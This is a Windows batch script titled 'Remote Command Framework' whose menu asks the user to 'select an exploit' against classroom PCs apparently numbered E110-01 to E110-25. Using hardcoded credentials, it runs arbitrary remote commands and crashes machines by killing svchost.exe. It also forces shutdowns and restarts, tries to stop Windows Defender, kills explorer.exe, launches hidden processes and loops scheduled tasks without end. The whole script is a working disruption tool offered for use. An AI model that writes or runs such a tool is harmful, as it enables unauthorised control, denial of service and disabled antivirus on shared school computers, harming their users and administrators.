@echo off
setlocal enabledelayedexpansion

:Start
cls
echo Enter the class name for the PCs (e.g., E110), or type 'test' for testing:
set /p className=

if /i "!className!"=="test" (
    set className=DESKTOP-BN6MPN3
    set testMode=1
) else (
    set className=E110-!className!
    set testMode=0
)

:MainMenu
cls
echo Remote Command Framework
echo ========================
echo 1. Send Hello Message (theory)
echo 2. Send Custom Command (theory)
echo 3. BSOD pc
echo 4. Get System Information
echo 5. Shutdown Remote PC
echo 6. Restart Remote PC
echo 7. Query Logged-in Users
echo 8. Attempt Disable AV
echo 9. Query Services
echo 10. Kill Explorer.exe
echo 11. Start Process Hidden
echo 12. Start Process with UI
echo 13. Start Process with UI Infinitely
echo e. Exit
echo ------------------------
echo Please select an exploit:
set /p option=

if "!option!"=="1" goto HelloMessage
if "!option!"=="2" goto CustomCommand
if "!option!"=="3" goto QuitProcess
if "!option!"=="4" goto GetSystemInfo
if "!option!"=="5" goto ShutdownPC
if "!option!"=="6" goto RestartPC
if "!option!"=="7" goto QueryUsers
if "!option!"=="8" goto DisableAV
if "!option!"=="9" goto QueryServices
if "!option!"=="10" goto KillExplorer
if "!option!"=="11" goto StartProcessHidden
if "!option!"=="12" goto StartProcessUI
if "!option!"=="13" goto StartProcessUIInfinite
if "!option!"=="e" goto EndScript
echo Invalid option, try again.
pause
goto MainMenu

:HelloMessage
call :SelectPC
if "!pcs!"=="return" goto MainMenu

for %%i in (!pcs!) do (
    if "!testMode!"=="1" (
        echo Sending hello message to !className!...
        cmd /c "start \\!className!\c$\windows\system32\cmd.exe /k echo hello %%COMPUTERNAME%%"
    ) else (
        echo Sending hello message to !className!%%i...
        cmd /c "start \\!className!%%i\c$\windows\system32\cmd.exe /k echo hello %%COMPUTERNAME%%"
    )
)
goto ExploitComplete

:CustomCommand
call :SelectPC
if "!pcs!"=="return" goto MainMenu

echo Enter the custom command you want to send:
set /p userCmd=

for %%i in (!pcs!) do (
    if "!testMode!"=="1" (
        echo Sending custom command to !className!...
        cmd /c "start \\!className!\c$\windows\system32\cmd.exe /k !userCmd!"
    ) else (
        echo Sending custom command to !className!%%i...
        cmd /c "start \\!className!%%i\c$\windows\system32\cmd.exe /k !userCmd!"
    )
)
goto ExploitComplete

:QuitProcess
call :SelectPC
if "!pcs!"=="return" goto MainMenu

for %%i in (!pcs!) do (
    if "!testMode!"=="1" (
        echo Terminating process on !className!...
        taskkill /S !className! /U student /P router /F /IM svchost.exe
    ) else (
        echo Terminating process on !className!%%i...
        taskkill /S !className!%%i /U student /P router /F /IM svchost.exe
    )
)
goto ExploitComplete

:GetSystemInfo
call :SelectPC
if "!pcs!"=="return" goto MainMenu

for %%i in (!pcs!) do (
    if "!testMode!"=="1" (
        echo Retrieving system information from !className!...
        systeminfo /S !className! /U student /P router
    ) else (
        echo Retrieving system information from !className!%%i...
        systeminfo /S !className!%%i /U student /P router
    )
)
goto ExploitComplete

:ShutdownPC
call :SelectPC
if "!pcs!"=="return" goto MainMenu

for %%i in (!pcs!) do (
    if "!testMode!"=="1" (
        echo Shutting down !className!...
        shutdown /s /m \\!className! /t 0 /f /U student /P router
    ) else (
        echo Shutting down !className!%%i...
        shutdown /s /m \\!className!%%i /t 0 /f /U student /P router
    )
)
goto ExploitComplete

:RestartPC
call :SelectPC
if "!pcs!"=="return" goto MainMenu

for %%i in (!pcs!) do (
    if "!testMode!"=="1" (
        echo Restarting !className!...
        shutdown /r /m \\!className! /t 0 /f /U student /P router
    ) else (
        echo Restarting !className!%%i...
        shutdown /r /m \\!className!%%i /t 0 /f /U student /P router
    )
)
goto ExploitComplete

:QueryUsers
call :SelectPC
if "!pcs!"=="return" goto MainMenu

for %%i in (!pcs!) do (
    if "!testMode!"=="1" (
        echo Querying logged-in users on !className!...
        wmic /node:"!className!" /user:student /password:router ComputerSystem Get UserName
    ) else (
        echo Querying logged-in users on "!className!%%i" /user:student /password:router ComputerSystem Get UserName
    )
)
goto ExploitComplete

:DisableAV
call :SelectPC
if "!pcs!"=="return" goto MainMenu

for %%i in (!pcs!) do (
    if "!testMode!"=="1" (
        echo Attempting to disable AV on !className!...
        net use \\!className!\admin$ password123 /user:admin
        sc \\!className! stop WinDefend /user:student /password:router
    ) else (
        echo Attempting to disable AV on !className!%%i...
        net use \\!className!%%i\admin$ password123 /user:admin
        sc \\!className!%%i stop WinDefend /user:student /password:router
    )
)
goto ExploitComplete

:QueryServices
call :SelectPC
if "!pcs!"=="return" goto MainMenu

for %%i in (!pcs!) do (
    if "!testMode!"=="1" (
        echo Querying services on !className!...
        sc \\!className! query /user:student /password:router
    ) else (
        echo Querying services on !className!%%i...
        sc \\!className!%%i query /user:student /password:router
    )
)
goto ExploitComplete

:KillExplorer
call :SelectPC
if "!pcs!"=="return" goto MainMenu

for %%i in (!pcs!) do (
    if "!testMode!"=="1" (
        echo Killing explorer.exe on !className!...
        taskkill /S !className! /U student /P router /F /IM explorer.exe
    ) else (
        echo Killing explorer.exe on !className!%%i...
        taskkill /S !className!%%i /U student /P router /F /IM explorer.exe
    )
)
goto ExploitComplete

:StartProcessHidden
call :SelectPC
if "!pcs!"=="return" goto MainMenu

echo Enter the process name you want to start hidden (e.g., notepad.exe):
set /p processName=

for %%i in (!pcs!) do (
    if "!testMode!"=="1" (
        echo Starting !processName! hidden on !className!...
        wmic /node:"!className!" /user:student /password:router process call create "!processName!"
    ) else (
        echo Starting !processName! hidden on !className!%%i...
        wmic /node:"!className!%%i" /user:student /password:router process call create "!processName!"
    )
)
goto ExploitComplete

:StartProcessUI
call :SelectPC
if "!pcs!"=="return" goto MainMenu

echo Enter the process name you want to start with UI (e.g., notepad.exe):
set /p processName=

for %%i in (!pcs!) do (
    if "!testMode!"=="1" (
        echo Creating scheduled task to start !processName! with UI on !className!...
        schtasks /create /s "!className!" /u student /p router /tn "Launch!processName!" /tr "!processName!" /sc once /st 00:00 /rl highest /f
        echo Running the scheduled task...
        schtasks /run /s "!className!" /u student /p router /tn "Launch!processName!"
    ) else (
        echo Creating scheduled task to start !processName! with UI on !className!%%i...
        schtasks /create /s "!className!%%i" /u student /p router /tn "Launch!processName!" /tr "!processName!" /sc once /st 00:00 /rl highest /f
        echo Running the scheduled task...
        schtasks /run /s "!className!%%i" /u student /p router /tn "Launch!processName!"
    )
)
goto ExploitComplete


:StartProcessUIInfinite
call :SelectPC
if "!pcs!"=="return" goto MainMenu

echo Enter the process name you want to start infinitely with UI (e.g., notepad.exe):
set /p processName=

for %%i in (!pcs!) do (
    if "!testMode!"=="1" (
        echo [INFO] Test mode enabled for !className!
        :InfiniteLoopTest
        set "taskName=Launch_!processName!_Test%random%"
        echo [INFO] Creating scheduled task to start !processName! with UI on !className!...
        timeout /t 2 /nobreak >nul
        schtasks /create /s "!className!" /u student /p router /tn "!taskName!" /tr "!processName!" /sc once /st 00:00 /rl highest /f
        echo [INFO] Scheduled task created, running the task...
        timeout /t 2 /nobreak >nul
        schtasks /run /s "!className!" /u student /p router /tn "!taskName!"
        echo [INFO] Task completed. Looping...
        timeout /t 2 /nobreak >nul
        goto InfiniteLoopTest
    ) else (
        echo [INFO] Normal mode enabled for !className!%%i
        :InfiniteLoop
        set "taskName=Launch_!processName!_%%i_%random%"
        echo [INFO] Creating scheduled task to start !processName! with UI on !className!%%i...
        timeout /t 2 /nobreak >nul
        schtasks /create /s "!className!%%i" /u student /p router /tn "!taskName!" /tr "!processName!" /sc once /st 00:00 /rl highest /f
        echo [INFO] Scheduled task created, running the task...
        timeout /t 2 /nobreak >nul
        schtasks /run /s "!className!%%i" /u student /p router /tn "!taskName!"
        echo [INFO] Task completed. Looping...
        timeout /t 2 /nobreak >nul
        goto InfiniteLoop
    )
)
goto ExploitComplete



:SelectPC
cls
echo Please choose the PC to target (1-25) or type 'all' for all PCs, or 'return' to go back:
set /p target=
if /i "!target!"=="return" (
    set pcs=return
    goto :eof
)
if "!testMode!"=="1" (
    set pcs=""
    goto :eof
)

if /i "!target!"=="all" (
    set pcs=01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25
) else (
    set /a pcnum=100+!target! 2>nul
    set pcs=!pcnum:~1,2!
)
goto :eof

:ExploitComplete
echo.
echo Exploit completed. Press any key to return to main menu.
pause
goto MainMenu

:EndScript
endlocal
pause
exit /b
